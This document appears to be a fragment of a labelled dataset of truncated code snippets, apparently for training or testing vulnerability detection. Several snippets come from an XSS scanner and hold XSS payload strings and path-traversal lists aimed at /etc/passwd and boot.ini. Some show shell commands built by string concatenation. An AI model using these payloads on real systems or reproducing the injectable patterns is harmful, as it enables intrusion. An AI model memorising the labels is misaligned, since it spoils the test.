self.save_screenshots=kwargs.get('save_screenshots', False) def __enter__", "label": 0}, {"snippet_id": 2225, "code": " headers, \"req_body\":body, \"res_headers\": xss_request_url.headers,\"res_body\": xss_request_url.text} dbupdate.insert_record(attack_result) def xss_get_uri(url,method,headers,body,scanid=None): db_update=", "label": 0}, {"snippet_id": 38920, "code": " isinstance(value, BaseDocument): \t\t\tif \"doctype\" not in value: \t\t\t\tvalue[\"doctype\"]=self.get_table_field_doctype(key) \t\t\t\tif not value[\"doctype\"]: \t\t\t\t\traise AttributeError(key) \t\t\tvalue=get_controller", "label": 0}, {"snippet_id": 42342, "code": "\tdel doc[k] \t\tif no_default_fields: \t\t\tfor k in list(doc): \t\t\t\tif k in default_fields: \t\t\t\t\tdel doc[k] \t\tfor key in(\"_user_tags\", \"__islocal\", \"__onload\", \"_liked_by\", \"__run_link_triggers\"): \t\t\tif self", "label": 0}, {"snippet_id": 2839, "code": "-1: impact=check_xss_impact(xss_request_uri.headers) print \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url)%(api_logger.G, api_logger.W) attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": url, \"alert", "label": 0}, {"snippet_id": 15029, "code": "): \"\"\" Returns the expected command to run pa11ycrawler. \"\"\" expected_statement=( 'pa11ycrawler run{start_urls} ' '--pa11ycrawler-allowed-domains=localhost ' '--pa11ycrawler-reports-dir={report_dir} ' ", "label": 0}, {"snippet_id": 49215, "code": "\".join(new_query) }) def get_reverse_sort_by(self): new_query=[] for column in self.query_order.split('.'): c=column.replace(\"-\", \"\") if int(c)==self.column_id: if column.startswith(\"-\"): new_query.append", "label": 0}, {"snippet_id": 24951, "code": ".imports_dir: self.should_fetch_course=False else: self.should_fetch_course=kwargs.get('should_fetch_course') self.imports_dir=path('test_root/courses/') self.pa11y_report_dir=os.path.join(self.report_dir", "label": 0}, {"snippet_id": 24132, "code": ".utils.test.suites.bokchoy_suite.sh') self._mock_sh=mock_sh.start() self.addCleanup(mock_sh.stop) def _expected_command(self, report_dir, start_urls): \"\"\" Returns the expected command to run pa11ycrawler. ", "label": 0}, {"snippet_id": 49133, "code": ".query_order) }) else: return self.get_url_with_query_params({ self.ordering_query_param: self.column_id }) elif self.current_columns_length > 1: new_query=[] for column in self.query_order.split('.'): c", "label": 0}, {"snippet_id": 45287, "code": ".owner, name=coordinator_doc.name, description=coordinator_doc.description, extra='coordinator2') if coordinator_data['properties']['workflow']: dependencies=Document2.objects.filter(type='oozie-workflow2',", "label": 0}, {"snippet_id": 11497, "code": "'): admin.autodiscover() urlpatterns=('', url(r'^update_certificate$', 'certificates.views.update_certificate'), url(r'^$', 'branding.views.index', name=\"root\"), url(r'^dashboard$', 'student.views.dashboard", "label": 0}, {"snippet_id": 44756, "code": " properties])) if copied_properties: _properties.update(copied_properties) response['status']=0 response['properties']=_properties response['name']='%s-%s' %(node['widgetType'].split('-')[0], node['id'][:4", "label": 0}, {"snippet_id": 54025, "code": " try: import bane except: print(\"You need to install: bane\") sys.exit() class sc(threading.Thread): def run(self): global stop ti=time.time() print(\"=\"*25) print(\"\\n[*]Target:{}\\n[*]Date:{}\".format(target", "label": 0}, {"snippet_id": 533, "code": "().split('/')[-1]=='API': path='../Payloads/xss.txt' else: path='Payloads/xss.txt' with open(path) as f: for line in f: if line: payload_list.append(line.rstrip()) return payload_list def check_xss_impact", "label": 1}, {"snippet_id": 36648, "code": ").validate() \t\tif not self.blog_intro: \t\t\tself.blog_intro=self.content[:140] \t\t\tself.blog_intro=strip_html_tags(self.blog_intro) \t\tif self.blog_intro: \t\t\tself.blog_intro=self.blog_intro[:140] \t\tif self", "label": 0}, {"snippet_id": 46494, "code": " def admin_collections(request, is_redirect=False, is_mobile=False): existing_hue_collections=DashboardController(request.user).get_search_collections() if request.GET.get('format')=='json': collections", "label": 0}, {"snippet_id": 20275, "code": " corrupt noseid files and system state. Just press it once.\\n' while True: try: sleep(10000) except KeyboardInterrupt: print \"Stopping bok-choy servers.\\n\" break @property def cmd(self): \"\"\" This method", "label": 0}, {"snippet_id": 46559, "code": "'is_redirect': is_redirect }) def admin_collection_delete(request): if request.method !='POST': raise PopupException(_('POST request required.')) collections=json.loads(request.POST.get('collections')) searcher", "label": 0}, {"snippet_id": 45567, "code": "('name', d.content_object.name)]) for d in Document.objects.get_docs(request.user, Document2, extra='coordinator2')] return render('editor/bundle_editor.mako', request,{ 'bundle_json': bundle.json, 'coordinators_json", "label": 1}, {"snippet_id": 51366, "code": " class UploadLogAdmin(ImportExportModelAdmin, admin.ModelAdmin): list_display=('original_filename', 'internal_filename', 'message', 'user', 'upload_date', 'filesize') search_fields=('internal_filename'", "label": 1}, {"snippet_id": 29683, "code": " \toutput=stdout.splitlines() \t \treturn output, stderr def show_backends(serv, **kwargs): \timport json \timport sql \thaproxy_sock_port=sql.get_setting('haproxy_sock_port') \tcmd='echo \"show backend\" |nc %s", "label": 0}, {"snippet_id": 47174, "code": " import Admin, menu from mock import patch from sqlalchemy.exc import SQLAlchemyError from invenio_records.admin import record_adminview from invenio_records.api import Record def test_admin(app, db): \"", "label": 0}, {"snippet_id": 10031, "code": " \" \"SCREENSHOT_DIR='{repo_dir}/test_root/log{shard_str}' \" \"BOK_CHOY_HAR_DIR='{repo_dir}/test_root/log{shard_str}/hars' \" \"BOKCHOY_A11Y_CUSTOM_RULES_FILE='{repo_dir}/{a11y_custom_file}' \" \"SELENIUM_DRIVER_LOG_DIR", "label": 0}, {"snippet_id": 43467, "code": " \t\t\treturn \t\tfor df in self.meta.get('fields',{'fieldtype':('=', 'Password')}): \t\t\tif self.flags.ignore_save_passwords and df.fieldname in self.flags.ignore_save_passwords: continue \t\t\tnew_password=self", "label": 0}, {"snippet_id": 27225, "code": " Method \" +rtype.upper() except Exception, e: print \"[-] scan_for_forms(): Error \" +str(e) return def banner(): print \"BEstAutomaticXSSFinder v1.0\" print \"DISCLAIMER: For testing purposes only!\\n\" if __name__", "label": 1}, {"snippet_id": 45891, "code": " import json import logging from django.utils.html import escape from django.utils.translation import ugettext as _ from django.core.urlresolvers import reverse from desktop.conf import USE_NEW_EDITOR from", "label": 0}, {"snippet_id": 8469, "code": "('ENABLE_DJANGO_ADMIN_SITE'): admin.autodiscover() urlpatterns=('', url(r'^update_certificate$', 'certificates.views.update_certificate'), url(r'^$', 'branding.views.index', name=\"root\"), url(r'^dashboard$", "label": 0}, {"snippet_id": 5640, "code": "(confirm)()//' '<imG/sRc=l oNerrOr=(prompt)() x>', '<!--<iMg sRc=--><img src=x oNERror=(prompt)`` x>', '<deTails open oNToggle=confi\\u0072m()>', '<img sRc=l oNerrOr=(confirm)() x>', '<svg/x=\">\"/onload=confirm", "label": 0}, {"snippet_id": 36654, "code": ".content[:140] \t\t\tself.blog_intro=strip_html_tags(self.blog_intro) \t\tif self.blog_intro: \t\t\tself.blog_intro=self.blog_intro[:140] \t\tif self.published and not self.published_on: \t\t\tself.published_on=today(", "label": 0}, {"snippet_id": 29288, "code": "\t\tos.system(\"dos2unix \"+cfg) \texcept OSError: \t\treturn 'Please install dos2unix' \t\tpass \t \tif kwargs.get(\"keepalived\")==1: \t\tif kwargs.get(\"just_save\")==\"save\": \t\t\tcommands=[ \"sudo mv -f \" +tmp_file +\"", "label": 0}, {"snippet_id": 17687, "code": " name=\"login\"), url(r'^login_ajax/(?P<error>[^/]*)$', 'student.views.login_user'), url(r'^logout$', 'student.views.logout_user', name='logout'), url(r'^create_account$', 'student.views.create_account',", "label": 0}, {"snippet_id": 9863, "code": ", 'lms_migration.migrate.gitreload'), url(r'^gitreload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.gitreload'), ) if settings.MITX_FEATURES.get('ENABLE_SQL_TRACKING_LOGS'): urlpatterns +=( url(r'^event_logs$", "label": 0}, {"snippet_id": 51042, "code": "(self): print('cleaning') cleaned_data=super(PeriodicTaskForm, self).clean() return cleaned_data class IEPeriodicTaskAdmin(PeriodicTaskAdmin, ImportExportModelAdmin): list_display=('name_safe', 'enabled',", "label": 0}, {"snippet_id": 440, "code": ".path break if parsed_url=='': parsed_url=url xss_request_url=req.api_request(parsed_url+'/'+payload,\"GET\",headers) xss_request_uri=req.api_request(parsed_url+'/?test='+payload,\"GET\",headers) logs.logging", "label": 0}, {"snippet_id": 13852, "code": "<chapter>[^/]*)/(?P<section>[^/]*)/(?P<position>[^/]*)/?$', 'courseware.views.index', name=\"courseware_position\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress$', 'courseware.views.progress'", "label": 0}, {"snippet_id": 21203, "code": "'courseware.views.mktg_course_about', name=\"mktg_about_course\"), url(r'^mktg/(?P<course_id>.*)$', 'courseware.views.mktg_course_about', name=\"mktg_about_course\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/", "label": 0}, {"snippet_id": 52988, "code": "=coordinator.data['properties']['workflow'], workflows): raise PopupException(_('You don\\'t have access to the workflow of this coordinator.')) return render('editor/coordinator_editor.mako', request,{ ", "label": 1}, {"snippet_id": 20520, "code": " course...\") print msg sh( 'tar zxf{zipped_course} -C{courses_dir}'.format( zipped_course=zipped_course, courses_dir=self.imports_dir, ) ) def generate_html_reports(self): \"\"\" Runs pa11ycrawler json-to", "label": 0}, {"snippet_id": 3995, "code": "\"res_body\": ref_header_xss.text} dbupdate.insert_record(attack_result) return def xss_get_url(url,method,headers,body,scanid=None): result='' xss_payloads=fetch_xss_payload() uri_check_list=['?', '&', ", "label": 0}, {"snippet_id": 33487, "code": " from frappe.utils import today, cint, global_date_format, get_fullname, strip_html_tags, markdown from frappe.website.utils import find_first_image, get_comment_list class BlogPost(WebsiteGenerator): ", "label": 1}, {"snippet_id": 18588, "code": "'course_groups.views.list_cohorts', name=\"cohorts\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/add$', 'course_groups.views.add_cohort', name=\"add_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/", "label": 0}, {"snippet_id": 34547, "code": " in value: \t\t\t\tself.append(key, v) \t\telse: \t\t\traise ValueError \tdef remove(self, doc): \t\tself.get(doc.parentfield).remove(doc) \tdef _init_child(self, value, key): \t\tif not self.doctype: \t\t\treturn value \t", "label": 0}, {"snippet_id": 37271, "code": ".blog_intro: \t\t\tself.blog_intro=self.content[:140] \t\t\tself.blog_intro=strip_html_tags(self.blog_intro) \t\tif self.blog_intro: \t\t\tself.blog_intro=self.blog_intro[:140] \t\tif self.published and not self.published_on", "label": 0}, {"snippet_id": 6322, "code": " the IdP authentication should listen on(integer). \"\"\" return self.config.getint(self.section, 'listen_port') @property def pysaml2_config(self): \"\"\" pysaml2 configuration file. Separate config file with", "label": 0}, {"snippet_id": 8772, "code": "'404.html'}, name=\"404\"), ) if not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: urlpatterns +=( url(r'^jobs$', 'static_template_view.views.render', {'template': 'jobs.html'}, name=\"jobs\"), url(r'^press$", "label": 0}, {"snippet_id": 48205, "code": " def action_add_multiple_media(request: HttpRequest): try: category: str=request.POST[\"category\"] files=request.FILES.getlist('files') user: Profile=get_current_user(request) for f in files: handle_file", "label": 0}, {"snippet_id": 25871, "code": " ) elif q.type==Question.TYPE_TIME: field=forms.TimeField( label=q.question, required=q.required, help_text=help_text, initial=dateutil.parser.parse(initial.answer).time() if initial and initial.answer", "label": 0}, {"snippet_id": 26691, "code": "%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini", "label": 0}, {"snippet_id": 44522, "code": ".')) return HttpResponse(json.dumps(response), mimetype=\"application/json\") @check_document_modify_permission() def save_workflow(request): response={'status': -1} workflow=json.loads(request.POST.get(", "label": 0}, {"snippet_id": 51173, "code": "(CrontabSchedule) admin.site.register(PeriodicTask, IEPeriodicTaskAdmin) admin.site.register(CrontabSchedule, IECrontabSchedule) class DashboardUserInline(admin.StackedInline): model=DashboardUser can_delete", "label": 0}, {"snippet_id": 36149, "code": ") \t\tif fieldname not in self._precision[cache_key]: \t\t\tself._precision[cache_key][fieldname]=None \t\t\tdoctype=self.meta.get_field(parentfield).options if parentfield else self.doctype \t\t\tdf=frappe.get_meta", "label": 0}, {"snippet_id": 29371, "code": "\t\tif sql.get_setting('firewall_enable')==\"1\": \t\t\tcommands.extend(open_port_firewalld(cfg)) \t \terror +=str(upload(serv, tmp_file, cfg, dir='fullpath')) \ttry: \t\terror +=ssh_command(serv, commands) \texcept", "label": 0}, {"snippet_id": 11969, "code": ".course_wiki_redirect', name=\"course_wiki\"), url(r'^courses/(?:[^/]+/[^/]+/[^/]+)/wiki/', include(wiki_pattern())), ) if settings.COURSEWARE_ENABLED: urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+", "label": 0}, {"snippet_id": 23729, "code": "\" \"--with-xunit \" \"--xunit-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml \" \"--verbosity=2 \" ).format( default_store=store, repo_dir=REPO_DIR, shard_str='/shard_' +self.shard if self.shard else ", "label": 0}, {"snippet_id": 47038, "code": " from flask_admin.contrib.sqla import ModelView from flask_babelex import gettext as _ from invenio_admin.filters import FilterConverter from invenio_db import db from markupsafe import Markup from sqlalchemy", "label": 0}, {"snippet_id": 51092, "code": " @staticmethod def runs(obj): return obj.total_run_count @staticmethod def due(obj): if obj.last_run_at: return obj.schedule.remaining_estimate(last_run_at=obj.last_run_at) else: z, y=obj.schedule.is_due", "label": 0}, {"snippet_id": 18872, "code": "<course_id>[^/]+/[^/]+/[^/]+)/$', 'external_auth.views.course_specific_register', name='course-specific-register'), ) if settings.MITX_FEATURES.get('AUTH_USE_OPENID_PROVIDER'): urlpatterns +=( url(r'^openid", "label": 0}, {"snippet_id": 11709, "code": "?i)university_profile/WellesleyX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'WellesleyX'}), url(r'^(?i)university_profile/McGillX$', 'courseware", "label": 0}, {"snippet_id": 46675, "code": ") kwargs['entry_form_config']=entry_form_config question_ids={str(q['id']) for q in entry_form_config} data={ f'{item}': f'{value}' for item, value in self.request.GET.items() if item in question_ids }", "label": 0}, {"snippet_id": 8696, "code": "(?i)university_profile/McGillX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'McGillX'}), url(r'^(?i)university_profile/TorontoX$', 'courseware.views", "label": 0}, {"snippet_id": 3073, "code": ": if line: payload_list.append(line.rstrip()) return payload_list def check_xss_impact(res_headers): print \"response header\",res_headers['Content-Type'] if res_headers['Content-Type']: if res_headers['Content", "label": 0}, {"snippet_id": 28749, "code": " style=\"color: red\">How did you get here?! O_o You do not have need permissions</h>') \t\tprint('<meta http-equiv=\"refresh\" content=\"5; url=/\">') \t\timport sys \t\tsys.exit() \t\t\t\t def ssh_connect(serv, **kwargs", "label": 0}, {"snippet_id": 43510, "code": "(self, fieldname='password', raise_exception=True): \t\tif self.get(fieldname) and not self.is_dummy_password(self.get(fieldname)): \t\t\treturn self.get(fieldname) \t\treturn get_decrypted_password(self.doctype", "label": 0}, {"snippet_id": 3236, "code": "=fetch_xss_payload() for payload in xss_payloads: parse_domain=urlparse.urlparse(url).netloc host_header={\"Host\": parse_domain +'/' +payload} headers.update(host_header) host_header_xss=req.api_request(url, \"GET", "label": 0}, {"snippet_id": 38827, "code": " \t\t\tif not self.__dict__.get(key): \t\t\t\tself.__dict__[key]=[] \t\t\tvalue=self._init_child(value, key) \t\t\tself.__dict__[key].append(value) \t\t\t \t\t\tvalue.parent_doc=self \t\t\treturn value \t\telse: \t\t\t \t\t\t \t\t\tif", "label": 0}, {"snippet_id": 7697, "code": ".html_index', name=\"html_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$', 'staticbook.views.html_index'), url(r'^courses/(?P<course_id>", "label": 1}, {"snippet_id": 34420, "code": " \t\t\treturn value \t\telse: \t\t\treturn self.__dict__ \tdef getone(self, key, filters=None): \t\treturn self.get(key, filters=filters, limit=1)[0] \tdef set(self, key, value, as_value=False): \t\tif isinstance(value", "label": 0}, {"snippet_id": 35322, "code": ".append((fieldname, get_msg(frappe._dict(label=fieldname)))) \t\treturn missing \tdef get_invalid_links(self, is_submittable=False): \t\t'''Returns list of invalid links and also updates fetch values if not set", "label": 0}, {"snippet_id": 6438, "code": "(self): \"\"\" SSL certificate chain filename \"\"\" return self.config.get(self.section, 'cert_chain') @property def userdb_mongo_uri(self): \"\"\" UserDB MongoDB connection URI(string). See MongoDB documentation", "label": 0}, {"snippet_id": 4580, "code": "'dl', 'dt', 'element', 'em', 'embed', 'fieldset', 'figcaption', 'figure', 'font', 'footer', 'form', 'frame', 'frameset', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6', 'head', 'header', 'hgroup', 'hr', 'html', 'i", "label": 0}, {"snippet_id": 26544, "code": "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', '../../etc/passwd%00', '../../../etc/passwd%00', '../../../../etc/passwd%00', '../../../../../etc/passwd%00', '../", "label": 0}, {"snippet_id": 42069, "code": "\", None): \t\t\tvalue.idx=len(self.get(key) or[]) +1 \t\tif not getattr(value, \"name\", None): \t\t\tvalue.__dict__['__islocal']=1 \t\treturn value \tdef get_valid_dict(self, sanitize=True, convert_dates_to_str=False", "label": 0}, {"snippet_id": 14633, "code": "' +self.shard if self.shard else '', exp_text=name, a11y_custom_file='node_modules/edx-custom-a11y-rules/lib/custom_a11y_rules.js', verify_xss=verify_xss ) return expected_statement def setUp(self): super", "label": 0}, {"snippet_id": 882, "code": "/plain' in xss_request['Content-Type']: impact=\"Low\" else: impact=\"High\" else: impact=\"Low\" return impact def xss_get_url(url,method,headers,body,scanid=None): xss_result='' xss_payloads=fetch_xss_payload", "label": 1}, {"snippet_id": 51995, "code": " import render from desktop.lib.exceptions_renderable import PopupException from desktop.lib.i18n import smart_str from desktop.lib.rest.http_client import RestException from desktop.models import Document", "label": 0}, {"snippet_id": 21835, "code": " if settings.MITX_FEATURES.get('AUTH_USE_OPENID'): urlpatterns +=( url(r'^openid/login/$', 'django_openid_auth.views.login_begin', name='openid-login'), url(r'^openid/complete/$', 'external_auth.views.openid_login_complete", "label": 0}, {"snippet_id": 30496, "code": "\"1\": \t\tlocal_path_logs='/var/log/modsec_audit.log' \t\tcommands=[ \"sudo cat %s |tail -%s %s %s\" %(local_path_logs, rows, grep_act, grep)]\t \t\t \tfunct.ssh_command(syslog_server, commands, show_log=\"1\") \t if", "label": 0}, {"snippet_id": 47484, "code": "\"active\", text=\"User Active\", checked=CheckEnum.CHECKED)) else: m: CheckEnum=CheckEnum.CHECKED if not profile.active: m=CheckEnum.NOT_CHECKED f.add_content(CheckBox(name=\"active\", text=\"User Active\", checked", "label": 0}, {"snippet_id": 44858, "code": "['message']=str(e) return HttpResponse(json.dumps(response), mimetype=\"application/json\") @check_document_access_permission() def workflow_parameters(request): response={'status': -1} try: workflow=Workflow", "label": 0}, {"snippet_id": 25006, "code": "( urlencode({ \"course_id\": self.course_key, \"depth\": \"all\", \"all_blocks\": \"true\", }) ) auto_auth_params.update({'redirect_to': sequence_url}) lms_params=urlencode(auto_auth_params) self.start_urls.append", "label": 0}, {"snippet_id": 50030, "code": ".JSONEncoder): def default(self, obj): if isinstance(obj, Promise): return force_unicode(obj) return super(LazyEncoder, self).default(obj) def jsonify(obj): return utils.to_str(json.dumps(obj, ensure_ascii=False", "label": 0}, {"snippet_id": 13223, "code": "'^password_reset_done/$', django.contrib.auth.views.password_reset_done, name='auth_password_reset_done'), url(r'^heartbeat$', include('heartbeat.urls')), ) if not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: urlpatterns ", "label": 0}, {"snippet_id": 42189, "code": "]=None \t\t\t\tif isinstance(d[fieldname], list) and df.fieldtype !='Table': \t\t\t\t\tfrappe.throw(_('Value for{0} cannot be a list').format(_(df.label))) \t\t\t\tif convert_dates_to_str and isinstance(d[fieldname", "label": 0}, {"snippet_id": 15256, "code": " tests(split or draft) num_processes -number of processes or threads to use in tests. Recommendation is that this is less than or equal to the number of available processors. verify_xss -when set, check for", "label": 0}, {"snippet_id": 49796, "code": "(` socket.emit('sendMSG','Connection Established.') `,1000) } catch{} socket.on('getMSG',function(data){ document.getElementById(\"history\").innerHTML+=\"<br><font size=3 color=black>[\"+data+\"]</font>\"; try", "label": 1}, {"snippet_id": 9004, "code": "?P<mod_id>.*?)/(?P<dispatch>[^/]*)$', 'courseware.module_render.xqueue_callback', name='xqueue_callback'), url(r'^change_setting$', 'student.views.change_setting', name='change_setting'), url(r'^calculate$", "label": 0}, {"snippet_id": 18593, "code": "\"cohorts\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/add$', 'course_groups.views.add_cohort', name=\"add_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)$'", "label": 0}, {"snippet_id": 51071, "code": ", 'crontab') search_fields=('name', 'queue', 'args') form=MyPeriodicTaskForm save_as=True @staticmethod def name_safe(obj): return mark_safe(obj.name) @staticmethod def last_run(obj): return obj.last_run_at", "label": 0}, {"snippet_id": 23791, "code": "): spec='test_foo.py' suite=BokChoyTestSuite('', test_spec=spec) name='tests/{}'.format(spec) self.assertEqual(suite.cmd, self._expected_command(name=name)) def test_class_spec(self): spec='test_foo.py", "label": 0}, {"snippet_id": 47074, "code": "\" filter_converter=FilterConverter() can_create=False can_edit=False can_delete=True can_view_details=True column_list=('id', 'version_id', 'updated', 'created',) column_details_list=('id', 'version_id", "label": 0}, {"snippet_id": 51890, "code": "} CELERY_accept_content=['pickle', 'yaml'] CELERY_task_serializer='pickle' CELERY_result_serializer='pickle' CELERY_BROKER_URL=os.environ.get('BROKER', 'redis://localhost:6379/0') ENABLE_UTC=True CELERY_ACCEPT_CONTENT", "label": 0}, {"snippet_id": 26008, "code": "'rows': 3}), 'company': forms.TextInput(attrs={'data-display-dependency': ' 'vat_id': forms.TextInput(attrs={'data-display-dependency': ' 'internal_reference': forms.TextInput, } labels={ 'is_business': ''", "label": 0}, {"snippet_id": 13114, "code": "/]*)$', 'static_template_view.views.index'), url(r'^accounts/login$', 'student.views.accounts_login', name=\"accounts_login\"), url(r'^login_ajax$', 'student.views.login_user', name=\"login\"), url(r'^login_ajax", "label": 0}, {"snippet_id": 29982, "code": " \t\tfunct.logging(\"local\", \"users.py \texcept: \t\tpass \t\t\t if serv and form.getvalue('ssl_cert'): \tcert_local_dir=funct.get_config_var('main', 'cert_local_dir') \tcert_path=sql.get_setting('cert_path') \t \tif", "label": 0}, {"snippet_id": 18687, "code": ", name='peer_grading'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes$', 'notes.views.notes', name='notes'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes/', include('notes.urls')), ) if", "label": 0}, {"snippet_id": 9945, "code": "', 'debug.views.run_python'), ) if settings.MITX_FEATURES.get('ENABLE_HINTER_INSTRUCTOR_VIEW'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/hint_manager$', 'instructor.hint_manager.hint_manager", "label": 0}, {"snippet_id": 29914, "code": "\"alert alert-danger\" style=\"margin:0\">Can not connect to the server</div>') \t\t if form.getvalue('ssh_cert'): \tname=form.getvalue('name') \t \tif not os.path.exists(os.getcwd()+'/keys/'): \t\tos.makedirs(os", "label": 0}, {"snippet_id": 42775, "code": "\tmissing.append((fieldname, get_msg(frappe._dict(label=fieldname)))) \t\treturn missing \tdef get_invalid_links(self, is_submittable=False): \t\t'''Returns list of invalid links and also updates fetch values", "label": 0}, {"snippet_id": 30001, "code": ") \t \tif not os.path.exists(cert_local_dir): \t\tos.makedirs(cert_local_dir) \t \tif form.getvalue('ssl_name') is None: \t\tprint('<div class=\"alert alert-danger\">Please enter desired name</div>') \telse: \t\tname", "label": 0}, {"snippet_id": 19450, "code": "\"\" process_count=2 expected_verbosity_string=( \"--with-xunitmp --xunitmp-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml\" \" --processes={procs} --no-color --process-timeout=1200\".format( repo_dir", "label": 0}, {"snippet_id": 43019, "code": " \t\t\treturn \t\tfor df in self.meta.get_select_fields(): \t\t\tif df.fieldname==\"naming_series\" or not(self.get(df.fieldname) and df.options): \t\t\t\tcontinue \t\t\toptions=(df.options or \"\").split(\"\\n\") \t\t\t \t\t\tif", "label": 0}, {"snippet_id": 21183, "code": " url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/about$', 'courseware.views.course_about', name=\"about_course\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/mktg-about$', 'courseware.views.mktg_course_about", "label": 0}, {"snippet_id": 43705, "code": ", currency=currency) \tdef is_print_hide(self, fieldname, df=None, for_print=True): \t\t\"\"\"Returns true if fieldname is to be hidden for print. \t\tPrint Hide can be set via the Print Format Builder or in the", "label": 0}, {"snippet_id": 19520, "code": " test_invalid_verbosity_and_processes(self): \"\"\" If an invalid combination of verbosity and number of processors is passed in, a BuildFailure should be raised \"\"\" suite=BokChoyTestSuite('', num_processes", "label": 0}, {"snippet_id": 17375, "code": "(r'^openid/provider/login/(?:.+)$', 'external_auth.views.provider_identity', name='openid-provider-login-identity'), url(r'^openid/provider/identity/$', 'external_auth.views.provider_identity', name='openid", "label": 0}, {"snippet_id": 14054, "code": "+)/cohorts/(?P<cohort_id>[0-9]+)$', 'course_groups.views.users_in_cohort', name=\"list_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/add$', 'course_groups.views", "label": 0}, {"snippet_id": 14527, "code": " for the bok-choy paver commands themselves. Run just this test with: paver test_lib -t pavelib/paver_tests/test_paver_bok_choy_cmds.py \"\"\" import os import unittest from mock import patch, call from test", "label": 0}, {"snippet_id": 10910, "code": " self).__exit__(exc_type, exc_value, traceback) if self.testsonly: msg=colorize('green', 'Running in testsonly mode... SKIPPING database cleanup.') print msg else: msg=colorize('green', \"Cleaning up databases", "label": 0}, {"snippet_id": 52926, "code": ": coordinators }) @check_document_access_permission() def edit_coordinator(request): coordinator_id=request.GET.get('coordinator') doc=None if coordinator_id: doc=Document2.objects.get(id=coordinator_id", "label": 0}, {"snippet_id": 37517, "code": ".title=blogger \telif frappe.local.form_dict.txt: \t\tlist_context.sub_title=_('Filtered by \"{0}\"').format(frappe.local.form_dict.txt) \tif list_context.sub_title: \t\tlist_context.parents=[{\"name\": _(\"Home\"", "label": 1}, {"snippet_id": 37075, "code": "\t\tifnull(t1.blog_intro, t1.content) as intro, \t\t\t\tt2.full_name, t2.avatar, t1.blogger, \t\t\t\t(select count(name) from `tabCommunication` \t\t\t\t\twhere \t\t\t\t\t\tcommunication_type='Comment' \t\t\t\t\t\tand comment_type", "label": 0}, {"snippet_id": 30450, "code": "\tlocal_path_logs=sql.get_setting('local_path_logs') \t\tsyslog_server=serv\t \t\tcommands=[ \"sudo cat %s| awk '$3>\\\"%s:00\\\" && $3<\\\"%s:00\\\"' |tail -%s %s %s\" %(local_path_logs, date, date1, rows, grep_act, grep)", "label": 0}, {"snippet_id": 18684, "code": ".views.peer_grading', name='peer_grading'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes$', 'notes.views.notes', name='notes'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes/', include", "label": 0}, {"snippet_id": 53155, "code": " response['status']=0 response['xml']=coordinator.to_xml() return HttpResponse(json.dumps(response), mimetype=\"application/json\") @check_document_access_permission() def submit_coordinator(request, doc_id", "label": 0}, {"snippet_id": 44867, "code": " @check_document_access_permission() def workflow_parameters(request): response={'status': -1} try: workflow=Workflow(document=Document2.objects.get(type='oozie-workflow2', uuid=request.GET.get('uuid'))) response", "label": 0}, {"snippet_id": 48423, "code": "=current_reservation ar.amount=amount if \"srid\" in request.GET: ar.SRID=SubReservation.objects.get(id=int(request.GET[\"srid\"])) ar.notes=str(request.POST[str(\"notes_\" +str(art.id))]) ar.save() if \"srid\" in request.GET:", "label": 1}, {"snippet_id": 36761, "code": "(self.content) \t\tif image: \t\t\tcontext.metatags[\"image\"]=image \t\tcontext.comment_list=get_comment_list(self.doctype, self.name) \t\tif not context.comment_list: \t\t\tcontext.comment_text=_('No comments yet')", "label": 0}, {"snippet_id": 2709, "code": " to XSS via referer header%s\".format(impact,url)%(api_logger.G, api_logger.W) attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": url, \"alert\": \"Cross Site Scripting via referer header\", \"impact\": impact", "label": 0}, {"snippet_id": 32934, "code": " in sorted(dirs): if d.startswith('.'): continue self.wfile.write('<a href=\"%s/%s\">%s/</a><br/>\\n' % (self.path.rstrip('/'), d, d)) break self.wfile.write('</div>') self._WriteTemplate('footer.html') def", "label": 1}, {"snippet_id": 14025, "code": "<course_id>[^/]+/[^/]+/[^/]+)/cohorts$', 'course_groups.views.list_cohorts', name=\"cohorts\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/add$', 'course_groups.views.add_cohort', name=\"add_cohort", "label": 0}, {"snippet_id": 4599, "code": "'head', 'header', 'hgroup', 'hr', 'html', 'i', 'iframe', 'image', 'img', 'input', 'ins', 'isindex', 